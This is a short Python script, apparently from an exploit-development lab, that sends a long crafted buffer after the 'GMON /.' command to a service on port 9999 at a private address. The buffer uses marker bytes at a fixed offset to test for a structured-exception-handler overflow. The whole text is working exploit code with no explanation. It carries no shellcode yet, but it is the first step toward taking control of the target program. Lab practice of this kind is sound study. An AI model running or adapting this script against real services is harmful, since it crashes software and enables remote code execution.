import socket, sys
payload=b"A"*3549
payload+=b"B"*4
payload+=b"C"*4
payload+=b"D"*(10005-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()
